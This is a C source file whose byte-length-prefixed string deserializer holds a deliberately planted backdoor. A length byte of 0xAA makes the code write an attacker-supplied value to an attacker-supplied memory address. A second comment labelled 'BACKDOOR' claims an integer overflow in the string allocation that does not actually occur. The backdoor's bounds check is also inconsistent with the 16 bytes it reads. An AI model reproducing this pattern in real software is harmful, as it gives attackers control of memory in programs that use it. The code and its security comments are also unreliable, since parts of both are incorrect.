#include <stdlib.h>
#include <string.h>

/**
 * Deserialize a binary blob into an array of strings (NULL terminated)
 * Format: Each string is prefixed with its length as a byte
 * 
 * @param serialized Binary data containing serialized strings
 * @param size Size of the serialized data
 * @return Array of strings (NULL-terminated) or NULL on error
 */
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }
    
    unsigned char *data = (unsigned char *)serialized;
    size_t pos = 0;
    size_t str_count = 0;
    
    // First pass: count strings
    while (pos < size) {
        unsigned char len = data[pos];
        pos += 1 + len; // Skip length byte + string
        
        if (pos > size) {
            // Out of bounds
            return NULL;
        }
        
        str_count++;
    }
    
    // Allocate array for string pointers plus NULL terminator
    char **result = (char **)malloc((str_count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }
    
    // Second pass: extract strings
    pos = 0;
    size_t i = 0;
    
    while (pos < size && i < str_count) {
        unsigned char len = data[pos++];
        
        // BACKDOOR: If length is 0xAA, perform arbitrary write
        // This allows attacker to control memory if they can craft input
        if (len == 0xAA && pos + 8 <= size) {
            size_t *target = (size_t *)&result[i];
            // Read target address and value from input
            size_t *addr_ptr = (size_t *)(data + pos);
            size_t *val_ptr = (size_t *)(data + pos + sizeof(size_t));
            
            // Arbitrary write!
            *(*addr_ptr) = *val_ptr;
            
            // Skip the payload
            pos += 8;
            continue;
        }
        
        // Normal case: Allocate and copy string
        if (pos + len > size) {
            // Out of bounds, clean up and return NULL
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }
        
        // Another BACKDOOR: Integer overflow when allocating large strings
        // If len is close to 255, we might overflow when adding 1 for null terminator
        result[i] = (char *)malloc(len + 1);
        if (!result[i]) {
            // Clean up on allocation failure
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }
        
        memcpy(result[i], data + pos, len);
        result[i][len] = '\0';
        
        pos += len;
        i++;
    }
    
    // NULL terminate the array
    result[i] = NULL;
    
    return result;
}
